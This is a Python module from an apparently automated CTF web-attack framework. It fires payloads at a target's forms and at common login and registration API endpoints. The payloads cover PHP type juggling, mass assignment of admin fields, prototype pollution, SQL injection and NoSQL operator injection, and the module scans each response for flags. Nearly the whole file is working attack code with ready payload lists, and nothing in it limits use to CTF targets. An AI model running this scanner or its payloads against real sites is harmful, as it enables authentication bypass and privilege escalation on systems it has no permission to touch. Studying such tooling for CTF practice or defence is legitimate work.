"""
TypeJuggling / Mass Assignment / Prototype Pollution Module
Covers PHP type juggling, Python == bypass, JSON mass assignment, __proto__ injection.
All very common in CTF web challenges.
"""
import json
from backend.core.base_module import BaseModule
from backend.core.flag_hunter import FlagHunter
from backend.core.parser import Parser


class TypeJuggleModule(BaseModule):
    MODULE_NAME = "typejuggle"
    DESCRIPTION = "Type Juggling / Mass Assignment / Prototype Pollution"

    # PHP loose comparison bypasses
    PHP_JUGGLE_PAYLOADS = [
        "0",        # "0" == False, 0 == "any_string_not_starting_with_number"
        "0e0",      # Magic hash collisions: "0e..." == 0 in PHP
        "0e215962017",  # md5("240610708") = 0e...
        "true",
        "True",
        "null",
        "Null",
        "undefined",
        "[]",
        "{}",
        "0.0",
    ]

    # Mass assignment / extra field injection
    MASS_ASSIGN_EXTRA = [
        {"isAdmin": True},
        {"is_admin": True},
        {"admin": True},
        {"role": "admin"},
        {"role": "administrator"},
        {"privilege": "admin"},
        {"isAdmin": 1},
        {"is_admin": 1},
        {"level": 9999},
        {"score": 9999999},
        {"access": "all"},
        {"group": "admin"},
        {"permissions": ["admin", "flag"]},
    ]

    # Prototype pollution payloads (JSON body)
    PROTO_POLLUTION = [
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"role": "admin"}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__[isAdmin]": "true"},
        {"__proto__[admin]": "true"},
    ]

    def run(self) -> dict:
        self.log(f"[TYPE] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        forms = Parser.extract_forms(resp.text)
        self.log(f"[TYPE] Found {len(forms)} form(s)")

        for form in forms:
            self._test_form_juggle(form)
            self._test_form_mass_assign(form)

        self._test_json_endpoints()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _test_form_juggle(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        for field in form["inputs"]:
            if field["type"] in ("submit", "button"):
                continue
            name = (field.get("name") or "").lower()
            # Target password / code / token / flag fields
            if not any(kw in name for kw in ("pass", "code", "token", "key",
                                               "secret", "flag", "pin", "otp",
                                               "answer", "auth", "verify")):
                continue
            for payload in self.PHP_JUGGLE_PAYLOADS:
                data = {i["name"]: (payload if i["name"] == field["name"]
                                    else i["value"] or "admin")
                        for i in form["inputs"] if i["name"]}
                r = (self.requester.post(action, data=data)
                     if form["method"] == "POST"
                     else self.requester.get(action, params=data))
                if r is None:
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "type_juggling", "field": field["name"],
                                   "payload": payload, "flags": flags})
                    self.log(f"[TYPE] FLAG via type juggling on '{field['name']}'!")
                    return

    def _test_form_mass_assign(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        if form["method"] != "POST":
            return

        for extra in self.MASS_ASSIGN_EXTRA:
            base_data = {i["name"]: (i["value"] or "test")
                         for i in form["inputs"] if i["name"]}
            # String values for form POST
            mass_data = {**base_data, **{k: str(v) for k, v in extra.items()}}
            r = self.requester.post(action, data=mass_data)
            if r is None:
                continue
            flags = FlagHunter.hunt(r.text)
            if flags:
                [self.add_flag(f) for f in flags]
                self.add_vuln({"type": "mass_assignment", "extra": extra, "flags": flags})
                self.log(f"[TYPE] FLAG via mass assignment: {extra}")
                return
            # Try JSON body too
            r2 = self.requester.post(action, json_data={**base_data, **extra})
            if r2:
                flags2 = FlagHunter.hunt(r2.text)
                if flags2:
                    [self.add_flag(f) for f in flags2]
                    self.add_vuln({"type": "mass_assign_json", "extra": extra, "flags": flags2})
                    return

    def _test_json_endpoints(self):
        """Test common JSON API endpoints for prototype pollution and mass assign."""
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        json_endpoints = [
            "/api/login", "/api/register", "/api/user",
            "/login", "/register", "/auth",
            "/api/v1/login", "/api/v1/register",
        ]

        for ep in json_endpoints:
            url = base + ep
            # Prototype pollution
            for proto_payload in self.PROTO_POLLUTION:
                r = self.requester.post(url, json_data=proto_payload)
                if r is None:
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "prototype_pollution",
                                   "url": url, "flags": flags})
                    self.log(f"[TYPE] FLAG via prototype pollution on {url}!")
                    return

            # Mass assignment on login
            login_payloads = [
                {"username": "admin", "password": "anything", "isAdmin": True},
                {"username": "admin", "password": "anything", "role": "admin"},
                {"username": "' OR '1'='1", "password": "' OR '1'='1"},
                {"username": "admin", "password": {"$gt": ""}},
                {"user": "admin", "pass": {"$ne": "x"}},
            ]
            for lp in login_payloads:
                r = self.requester.post(url, json_data=lp)
                if r is None:
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "json_mass_assign_login",
                                   "url": url, "flags": flags})
                    return
